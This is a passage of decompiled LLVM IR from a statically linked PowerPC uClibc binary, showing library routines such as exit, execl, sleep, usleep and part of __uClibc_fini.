  uselistorder label %dec_label_pc_1000b9f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9bc, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000bb58 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000bb64 = load i32, i32* @r3, align 4
  store i32 %v0_1000bb64, i32* @r31, align 4
  store i32 %v2_1000bb58, i32* @r3, align 4
  %v0_1000bb70 = call i32 @__pthread_return_void()
  %v0_1000bb78 = call i32 @__pthread_return_0()
  %v3_1000bb80 = load i32, i32* @global_var_10023554.348, align 4
  %v3_1000bb84 = icmp eq i32 %v3_1000bb80, 0
  br i1 %v3_1000bb84, label %dec_label_pc_1000bb98, label %dec_label_pc_1000bb8c

dec_label_pc_1000bb8c:                            ; preds = %entry
  %v0_1000bb8c = load i32, i32* @r31, align 4
  %v3_1000bb94 = call i32 @unknown_0(i32 %v0_1000bb8c, i32 268566528)
  br label %dec_label_pc_1000bb98

dec_label_pc_1000bb98:                            ; preds = %entry, %dec_label_pc_1000bb8c
  store i32 %v2_1000bb58, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_1000bba0 = call i32 @__pthread_return_void()
  store i32 %v0_1000bba0, i32* @r3, align 4
  store i32 268483496, i32* @lr, align 4
  %v1_1000bba4 = call i32 @__GI___uClibc_fini(i32 %v0_1000bba0)
  br i1 icmp eq (i32 add (i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 -31672), i32 0), label %dec_label_pc_1000bbbc, label %dec_label_pc_1000bbb8

dec_label_pc_1000bbb8:                            ; preds = %dec_label_pc_1000bb98
  store i32 268483516, i32* @lr, align 4
  %v2_1000bbb8 = call i32 @_stdio_term(i32 %v1_1000bba4, i32 add (i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 -31672))
  br label %dec_label_pc_1000bbbc

dec_label_pc_1000bbbc:                            ; preds = %dec_label_pc_1000bb98, %dec_label_pc_1000bbb8
  %v0_1000bbbc = load i32, i32* @r31, align 4
  %v1_1000bbc0 = call i32 @__GI__exit(i32 %v0_1000bbbc)
  ret i32 %v1_1000bbc0

; uselistorder directives
  uselistorder label %dec_label_pc_1000bbbc, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb98, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000bbc4 = ptrtoint i32* %stack_var_0 to i32
  %v2_1000bbe0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000bbe0, i32* %r0.global-to-local, align 4
  %v2_1000bbe8 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1000bbe0, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bc14

dec_label_pc_1000bc14:                            ; preds = %dec_label_pc_1000bc44, %entry
  %v0_1000bc18 = phi i32 [ 0, %entry ], [ %v1_1000bc18, %dec_label_pc_1000bc44 ]
  %stack_var_-52.0 = phi i32 [ %v2_1000bbe8, %entry ], [ %stack_var_-52.1, %dec_label_pc_1000bc44 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1000bc44 ]
  %v4_1000bc14 = zext i8 %stack_var_-56.0 to i32
  %v1_1000bc18 = add i32 %v0_1000bc18, 1
  %v1_1000bc20 = mul nuw nsw i32 %v4_1000bc14, 4
  store i32 %v1_1000bc20, i32* %r0.global-to-local, align 4
  %v2_1000bc24 = add i32 %v1_1000bc20, %v2_1000bbe0
  store i32 %v2_1000bc24, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1000bc38, label %dec_label_pc_1000bc30

dec_label_pc_1000bc30:                            ; preds = %dec_label_pc_1000bc14
  %v1_1000bc28 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000bc44

dec_label_pc_1000bc38:                            ; preds = %dec_label_pc_1000bc14
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1000bc3c = add i32 %stack_var_-52.0, 4
  store i32 %v1_1000bc3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000bc44

dec_label_pc_1000bc44:                            ; preds = %dec_label_pc_1000bc30, %dec_label_pc_1000bc38
  %stack_var_-52.1 = phi i32 [ %v1_1000bc3c, %dec_label_pc_1000bc38 ], [ %stack_var_-52.0, %dec_label_pc_1000bc30 ]
  %v0_1000bc44 = phi i32 [ %stack_var_-52.0, %dec_label_pc_1000bc38 ], [ %v2_1000bc24, %dec_label_pc_1000bc30 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1000bc38 ], [ %v1_1000bc28, %dec_label_pc_1000bc30 ]
  %v1_1000bc44 = inttoptr i32 %v0_1000bc44 to i32*
  %v2_1000bc44 = load i32, i32* %v1_1000bc44, align 4
  store i32 %v2_1000bc44, i32* %r0.global-to-local, align 4
  %v3_1000bc48 = icmp eq i32 %v2_1000bc44, 0
  br i1 %v3_1000bc48, label %dec_label_pc_1000bc50, label %dec_label_pc_1000bc14

dec_label_pc_1000bc50:                            ; preds = %dec_label_pc_1000bc44
  %v1_1000bc50 = mul i32 %v1_1000bc18, 4
  store i32 %v4_1000bbc4, i32* %r0.global-to-local, align 4
  %v1_1000bc58 = add i32 %v1_1000bc50, 34
  store i32 %v1_1000bc18, i32* %ctr.global-to-local, align 4
  %v1_1000bc60 = call i32 @__asm_rlwinm(i32 %v1_1000bc58, i32 0, i32 0, i32 27)
  %v1_1000bc68 = load i32, i32* @r1, align 4
  %v3_1000bc68 = sub i32 %v1_1000bc68, %v1_1000bc60
  %v4_1000bc68 = inttoptr i32 %v3_1000bc68 to i32*
  store i32 %v4_1000bbc4, i32* %v4_1000bc68, align 4
  %v1_1000bc6c = add i32 %v3_1000bc68, 23
  store i32 %v1_1000bc6c, i32* %r0.global-to-local, align 4
  %v1_1000bc70 = call i32 @__asm_rlwinm(i32 %v1_1000bc6c, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000bc78 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bc78 = inttoptr i32 %v1_1000bc70 to i32*
  store i32 %v0_1000bc78, i32* %v2_1000bc78, align 4
  store i32 %v1_1000bc70, i32* %r11.global-to-local, align 4
  %v0_1000bc80 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bc80 = trunc i32 %v0_1000bc80 to i8
  store i32 %v2_1000bbe0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000bbe0, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1000bc94

dec_label_pc_1000bc94:                            ; preds = %dec_label_pc_1000bcc8.dec_label_pc_1000bc94_crit_edge, %dec_label_pc_1000bc50
  %v0_1000bc98 = phi i32 [ %v1_1000bc70, %dec_label_pc_1000bc50 ], [ %v0_1000bc98.pre, %dec_label_pc_1000bcc8.dec_label_pc_1000bc94_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1000bbe8, %dec_label_pc_1000bc50 ], [ %stack_var_-52.3, %dec_label_pc_1000bcc8.dec_label_pc_1000bc94_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000bc80, %dec_label_pc_1000bc50 ], [ %stack_var_-56.3, %dec_label_pc_1000bcc8.dec_label_pc_1000bc94_crit_edge ]
  %v1_1000bc98 = add i32 %v0_1000bc98, 4
  store i32 %v1_1000bc98, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1000bcbc, label %dec_label_pc_1000bcac

dec_label_pc_1000bcac:                            ; preds = %dec_label_pc_1000bc94
  %v4_1000bc94 = zext i8 %stack_var_-56.2 to i32
  %v1_1000bca4 = add i8 %stack_var_-56.2, 1
  %v1_1000bca0 = mul nuw nsw i32 %v4_1000bc94, 4
  %v3_1000bcac = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1000bcac, i32* %r0.global-to-local, align 4
  %v2_1000bcb4 = add i32 %v3_1000bcac, %v1_1000bca0
  br label %dec_label_pc_1000bcc8

dec_label_pc_1000bcbc:                            ; preds = %dec_label_pc_1000bc94
  %v1_1000bcc0 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1000bcc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000bcc8

dec_label_pc_1000bcc8:                            ; preds = %dec_label_pc_1000bcac, %dec_label_pc_1000bcbc
  %stack_var_-52.3 = phi i32 [ %v1_1000bcc0, %dec_label_pc_1000bcbc ], [ %stack_var_-52.2, %dec_label_pc_1000bcac ]
  %v0_1000bcc8 = phi i32 [ %stack_var_-52.2, %dec_label_pc_1000bcbc ], [ %v2_1000bcb4, %dec_label_pc_1000bcac ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1000bcbc ], [ %v1_1000bca4, %dec_label_pc_1000bcac ]
  %v1_1000bcc8 = inttoptr i32 %v0_1000bcc8 to i32*
  %v2_1000bcc8 = load i32, i32* %v1_1000bcc8, align 4
  store i32 %v2_1000bcc8, i32* %r0.global-to-local, align 4
  %v2_1000bccc = inttoptr i32 %v1_1000bc98 to i32*
  store i32 %v2_1000bcc8, i32* %v2_1000bccc, align 4
  %v0_1000bcd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bcd0 = add i32 %v0_1000bcd0, -1
  store i32 %v1_1000bcd0, i32* %ctr.global-to-local, align 4
  %v2_1000bcd0 = icmp eq i32 %v1_1000bcd0, 0
  br i1 %v2_1000bcd0, label %dec_label_pc_1000bcd4, label %dec_label_pc_1000bcc8.dec_label_pc_1000bc94_crit_edge

dec_label_pc_1000bcc8.dec_label_pc_1000bc94_crit_edge: ; preds = %dec_label_pc_1000bcc8
  %v0_1000bc98.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000bc94

dec_label_pc_1000bcd4:                            ; preds = %dec_label_pc_1000bcc8
  %v3_1000bcd8 = load i32, i32* @global_var_1002355c.350, align 4
  store i32 268483808, i32* @lr, align 4
  %v2_1000bcdc = call i32 @__GI_execve(i32 %v3_1000bcd8, i32 268566528)
  %v0_1000bce0 = load i32, i32* @r1, align 4
  %v1_1000bce0 = inttoptr i32 %v0_1000bce0 to i32*
  %v2_1000bce0 = load i32, i32* %v1_1000bce0, align 4
  store i32 %v2_1000bce0, i32* %r11.global-to-local, align 4
  %v1_1000bce4 = add i32 %v2_1000bce0, 4
  %v2_1000bce4 = inttoptr i32 %v1_1000bce4 to i32*
  %v3_1000bce4 = load i32, i32* %v2_1000bce4, align 4
  store i32 %v3_1000bce4, i32* %r0.global-to-local, align 4
  ret i32 %v2_1000bcdc

; uselistorder directives
  uselistorder i32 %v1_1000bcd0, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000bc20, { 1, 0 }
  uselistorder i32 %v1_1000bc18, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000bbe0, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 4, 5 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder i8 1, { 0, 1, 11, 12, 2, 3, 13, 10, 14, 9, 8, 7, 6, 5, 4, 15 }
  uselistorder label %dec_label_pc_1000bcc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc44, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000bcf8 = icmp eq i32 %arg1, 0
  br i1 %v3_1000bcf8, label %dec_label_pc_1000beac, label %dec_label_pc_1000bd28.lr.ph

dec_label_pc_1000bd28.lr.ph:                      ; preds = %entry
  %v2_1000bd1c = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000bd1c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000bd2842 = add i32 %v2_1000bd1c, 132
  %v3_1000bd2843 = inttoptr i32 %v2_1000bd2842 to i32*
  store i32 0, i32* %v3_1000bd2843, align 4
  %v0_1000bd2c44 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bd2c45 = add i32 %v0_1000bd2c44, -1
  store i32 %v1_1000bd2c45, i32* %r11.global-to-local, align 4
  %v1_1000bd3046 = mul i32 %v1_1000bd2c45, 4
  %v1_1000bd3447 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000bd3448 = add i32 %v1_1000bd3447, %v1_1000bd3046
  %v0_1000bd3849 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bd3850 = add i32 %v0_1000bd3849, -1
  store i32 %v1_1000bd3850, i32* %ctr.global-to-local, align 4
  %v2_1000bd3851 = icmp eq i32 %v1_1000bd3850, 0
  br i1 %v2_1000bd3851, label %dec_label_pc_1000bd3c, label %dec_label_pc_1000bd28.dec_label_pc_1000bd28_crit_edge

dec_label_pc_1000bd28.dec_label_pc_1000bd28_crit_edge: ; preds = %dec_label_pc_1000bd28.lr.ph, %dec_label_pc_1000bd28.dec_label_pc_1000bd28_crit_edge
  %v2_1000bd3452 = phi i32 [ %v2_1000bd34, %dec_label_pc_1000bd28.dec_label_pc_1000bd28_crit_edge ], [ %v2_1000bd3448, %dec_label_pc_1000bd28.lr.ph ]
  %v0_1000bd28.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000bd28 = add i32 %v2_1000bd3452, 8
  %v3_1000bd28 = inttoptr i32 %v2_1000bd28 to i32*
  store i32 %v0_1000bd28.pre, i32* %v3_1000bd28, align 4
  %v0_1000bd2c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bd2c = add i32 %v0_1000bd2c, -1
  store i32 %v1_1000bd2c, i32* %r11.global-to-local, align 4
  %v1_1000bd30 = mul i32 %v1_1000bd2c, 4
  %v1_1000bd34 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000bd34 = add i32 %v1_1000bd34, %v1_1000bd30
  %v0_1000bd38 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bd38 = add i32 %v0_1000bd38, -1
  store i32 %v1_1000bd38, i32* %ctr.global-to-local, align 4
  %v2_1000bd38 = icmp eq i32 %v1_1000bd38, 0
  br i1 %v2_1000bd38, label %dec_label_pc_1000bd3c, label %dec_label_pc_1000bd28.dec_label_pc_1000bd28_crit_edge

dec_label_pc_1000bd3c:                            ; preds = %dec_label_pc_1000bd28.dec_label_pc_1000bd28_crit_edge, %dec_label_pc_1000bd28.lr.ph
  %v0_1000bd50.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bd3c = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000bd3c, i32* %r29.global-to-local, align 4
  store i32 %v2_1000bd3c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000bd50.pre, i32* %stack_var_-440, align 4
  %v0_1000bd54 = call i32 @__sigaddset()
  store i32 %v0_1000bd54, i32* %r3.global-to-local, align 4
  %v1_1000bd58 = icmp slt i32 %v0_1000bd54, 0
  br i1 %v1_1000bd58, label %dec_label_pc_1000beb4, label %dec_label_pc_1000bd60

dec_label_pc_1000bd60:                            ; preds = %dec_label_pc_1000bd3c
  %v2_1000bd60 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268483956, i32* @lr, align 4
  %v3_1000bd70 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1000bd3c, i32 %v2_1000bd60)
  store i32 %v3_1000bd70, i32* %r3.global-to-local, align 4
  %v3_1000bd74 = icmp eq i32 %v3_1000bd70, 0
  br i1 %v3_1000bd74, label %dec_label_pc_1000bd7c, label %dec_label_pc_1000beb4

dec_label_pc_1000bd7c:                            ; preds = %dec_label_pc_1000bd60
  store i32 %v2_1000bd60, i32* %r3.global-to-local, align 4
  %v2_1000bd84 = call i32 @__sigismember(i32 %v2_1000bd60, i32 17)
  store i32 %v2_1000bd84, i32* %r3.global-to-local, align 4
  %v3_1000bd88 = icmp eq i32 %v2_1000bd84, 0
  br i1 %v3_1000bd88, label %dec_label_pc_1000bda8.lr.ph, label %dec_label_pc_1000be74

dec_label_pc_1000bda8.lr.ph:                      ; preds = %dec_label_pc_1000bd7c
  store i32 %v2_1000bd1c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000bd2843, align 4
  %v0_1000bdac33 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bdac34 = add i32 %v0_1000bdac33, -1
  store i32 %v1_1000bdac34, i32* %r11.global-to-local, align 4
  %v1_1000bdb035 = mul i32 %v1_1000bdac34, 4
  %v1_1000bdb436 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bdb437 = add i32 %v1_1000bdb436, %v1_1000bdb035
  %v0_1000bdb838 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bdb839 = add i32 %v0_1000bdb838, -1
  store i32 %v1_1000bdb839, i32* %ctr.global-to-local, align 4
  %v2_1000bdb840 = icmp eq i32 %v1_1000bdb839, 0
  br i1 %v2_1000bdb840, label %dec_label_pc_1000bdbc, label %dec_label_pc_1000bda8.dec_label_pc_1000bda8_crit_edge

dec_label_pc_1000bda8.dec_label_pc_1000bda8_crit_edge: ; preds = %dec_label_pc_1000bda8.lr.ph, %dec_label_pc_1000bda8.dec_label_pc_1000bda8_crit_edge
  %v2_1000bdb441 = phi i32 [ %v2_1000bdb4, %dec_label_pc_1000bda8.dec_label_pc_1000bda8_crit_edge ], [ %v2_1000bdb437, %dec_label_pc_1000bda8.lr.ph ]
  %v0_1000bda8.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000bda8 = add i32 %v2_1000bdb441, 8
  %v3_1000bda8 = inttoptr i32 %v2_1000bda8 to i32*
  store i32 %v0_1000bda8.pre, i32* %v3_1000bda8, align 4
  %v0_1000bdac = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bdac = add i32 %v0_1000bdac, -1
  store i32 %v1_1000bdac, i32* %r11.global-to-local, align 4
  %v1_1000bdb0 = mul i32 %v1_1000bdac, 4
  %v1_1000bdb4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bdb4 = add i32 %v1_1000bdb4, %v1_1000bdb0
  %v0_1000bdb8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bdb8 = add i32 %v0_1000bdb8, -1
  store i32 %v1_1000bdb8, i32* %ctr.global-to-local, align 4
  %v2_1000bdb8 = icmp eq i32 %v1_1000bdb8, 0
  br i1 %v2_1000bdb8, label %dec_label_pc_1000bdbc, label %dec_label_pc_1000bda8.dec_label_pc_1000bda8_crit_edge

dec_label_pc_1000bdbc:                            ; preds = %dec_label_pc_1000bda8.dec_label_pc_1000bda8_crit_edge, %dec_label_pc_1000bda8.lr.ph
  store i32 %v2_1000bd3c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000bdc4 = call i32 @__sigaddset()
  store i32 %v0_1000bdc4, i32* %r3.global-to-local, align 4
  %v1_1000bdc8 = icmp slt i32 %v0_1000bdc4, 0
  br i1 %v1_1000bdc8, label %dec_label_pc_1000beb4, label %dec_label_pc_1000bdd0

dec_label_pc_1000bdd0:                            ; preds = %dec_label_pc_1000bdbc
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000bdd8 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268484064, i32* @lr, align 4
  %v4_1000bddc = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_1000bdd8)
  store i32 %v4_1000bddc, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000bddc, -1
  br i1 %tmp30, label %dec_label_pc_1000be10, label %dec_label_pc_1000bde8

dec_label_pc_1000bde8:                            ; preds = %dec_label_pc_1000bdd0
  %v0_1000bde8 = call i32 @__errno_location()
  store i32 %v0_1000bde8, i32* %r3.global-to-local, align 4
  %v1_1000bdf0 = inttoptr i32 %v0_1000bde8 to i32*
  %v2_1000bdf0 = load i32, i32* %v1_1000bdf0, align 4
  store i32 %v0_1000bde8, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268484100, i32* @lr, align 4
  %v3_1000be00 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000bd60, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000be08 = inttoptr i32 %v0_1000bde8 to i32*
  store i32 %v2_1000bdf0, i32* %v2_1000be08, align 4
  %v0_1000bec8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000beb8

dec_label_pc_1000be10:                            ; preds = %dec_label_pc_1000bdd0
  %v3_1000be10 = load i32, i32* %stack_var_-176, align 4
  %v3_1000be1c = icmp eq i32 %v3_1000be10, 1
  br i1 %v3_1000be1c, label %dec_label_pc_1000be24, label %dec_label_pc_1000be58

dec_label_pc_1000be24:                            ; preds = %dec_label_pc_1000be10
  store i32 %v2_1000bd1c, i32* %r3.global-to-local, align 4
  store i32 268484144, i32* @lr, align 4
  %v2_1000be2c = call i32 @__libc_nanosleep(i32 %v2_1000bd1c, i32 %v2_1000bd1c)
  store i32 %v2_1000be2c, i32* %r3.global-to-local, align 4
  store i32 %v2_1000be2c, i32* @r31, align 4
  %v0_1000be34 = call i32 @__errno_location()
  store i32 %v0_1000be34, i32* %r3.global-to-local, align 4
  store i32 %v0_1000be34, i32* %r29.global-to-local, align 4
  %v1_1000be44 = inttoptr i32 %v0_1000be34 to i32*
  %v2_1000be44 = load i32, i32* %v1_1000be44, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268484176, i32* @lr, align 4
  %v3_1000be4c = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000bd60, i32 0)
  store i32 %v3_1000be4c, i32* %r3.global-to-local, align 4
  %v1_1000be50 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000be50 = inttoptr i32 %v1_1000be50 to i32*
  store i32 %v2_1000be44, i32* %v2_1000be50, align 4
  %v0_1000be80.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000be80

dec_label_pc_1000be58:                            ; preds = %dec_label_pc_1000be10
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268484200, i32* @lr, align 4
  %v3_1000be64 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000bd60, i32 0)
  br label %dec_label_pc_1000be74

dec_label_pc_1000be74:                            ; preds = %dec_label_pc_1000bd7c, %dec_label_pc_1000be58
  store i32 %v2_1000bd1c, i32* %r3.global-to-local, align 4
  store i32 268484220, i32* @lr, align 4
  %v2_1000be78 = call i32 @__libc_nanosleep(i32 %v2_1000bd1c, i32 %v2_1000bd1c)
  store i32 %v2_1000be78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000be80

dec_label_pc_1000be80:                            ; preds = %dec_label_pc_1000be24, %dec_label_pc_1000be74
  %v0_1000be80 = phi i32 [ %v0_1000be80.pr, %dec_label_pc_1000be24 ], [ %v2_1000be78, %dec_label_pc_1000be74 ]
  %v3_1000be80 = icmp eq i32 %v0_1000be80, 0
  br i1 %v3_1000be80, label %dec_label_pc_1000beac, label %dec_label_pc_1000be88

dec_label_pc_1000be88:                            ; preds = %dec_label_pc_1000be80
  %v3_1000be98 = load i32, i32* %stack_var_-440, align 4
  %v0_1000be9c = call i32 @__asm_mfcr()
  store i32 %v0_1000be9c, i32* %r3.global-to-local, align 4
  %v1_1000bea0 = call i32 @__asm_rlwinm(i32 %v0_1000be9c, i32 30, i32 31, i32 31)
  %v2_1000bea4 = add i32 %v3_1000be98, %v1_1000bea0
  store i32 %v2_1000bea4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000beb8

dec_label_pc_1000beac:                            ; preds = %dec_label_pc_1000be80, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000beb8

dec_label_pc_1000beb4:                            ; preds = %dec_label_pc_1000bd60, %dec_label_pc_1000bdbc, %dec_label_pc_1000bd3c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000beb8

dec_label_pc_1000beb8:                            ; preds = %dec_label_pc_1000beac, %dec_label_pc_1000be88, %dec_label_pc_1000bde8, %dec_label_pc_1000beb4
  %v0_1000bec8 = phi i32 [ 0, %dec_label_pc_1000beac ], [ %v2_1000bea4, %dec_label_pc_1000be88 ], [ %v0_1000bec8.pre, %dec_label_pc_1000bde8 ], [ -1, %dec_label_pc_1000beb4 ]
  ret i32 %v0_1000bec8

; uselistorder directives
  uselistorder i32 %v1_1000bdb8, { 1, 0 }
  uselistorder i32 %v2_1000bd60, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_1000bd38, { 1, 0 }
  uselistorder i32 %v2_1000bd1c, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 1, 6, 0, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 0, 8, 9, 5, 4, 1, 6, 7 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_1000beb8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000beb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000be80, { 1, 0 }
  uselistorder label %dec_label_pc_1000be74, { 1, 0 }
  uselistorder label %dec_label_pc_1000bda8.dec_label_pc_1000bda8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd28.dec_label_pc_1000bd28_crit_edge, { 1, 0 }
}

define i32 @usleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000bee8 = udiv i32 %arg1, 1000000
  %v2_1000beec = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000bee8, i32* %stack_var_-24, align 4
  store i32 268484360, i32* @lr, align 4
  %v2_1000bf04 = call i32 @__libc_nanosleep(i32 %v2_1000beec, i32 0)
  ret i32 %v2_1000bf04

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 0, 2, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000bf68:
  %v3_1000bf6c = load i32, i32* @global_var_10023564.352, align 4
  %v3_1000bf70 = icmp eq i32 %v3_1000bf6c, 0
  br i1 %v3_1000bf70, label %dec_label_pc_1000bf80, label %dec_label_pc_1000bf78

dec_label_pc_1000bf78:                            ; preds = %dec_label_pc_1000bf68
  %v2_1000bf7c = load i32, i32* @r4, align 4
  %v3_1000bf7c = call i32 @unknown_0(i32 268566528, i32 %v2_1000bf7c)
  store i32 %v3_1000bf7c, i32* @r3, align 4
  br label %dec_label_pc_1000bf80

dec_label_pc_1000bf80:                            ; preds = %dec_label_pc_1000bf68, %dec_label_pc_1000bf78
  %v3_1000bf84 = load i32, i32* @global_var_10023568.353, align 4
  %v3_1000bf88 = icmp eq i32 %v3_1000bf84, 0
  br i1 %v3_1000bf88, label %dec_label_pc_1000bf80.dec_label_pc_1000bf98_crit_edge, label %dec_label_pc_1000bf90

dec_label_pc_1000bf80.dec_label_pc_1000bf98_crit_edge: ; preds = %dec_label_pc_1000bf80
  %v0_1000bfa8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000bf98

dec_label_pc_1000bf90:                            ; preds = %dec_label_pc_1000bf80
  %v2_1000bf94 = load i32, i32* @r4, align 4
  %v3_1000bf94 = call i32 @unknown_0(i32 268566528, i32 %v2_1000bf94)
  br label %dec_label_pc_1000bf98

dec_label_pc_1000bf98:                            ; preds = %dec_label_pc_1000bf80.dec_label_pc_1000bf98_crit_edge, %dec_label_pc_1000bf90
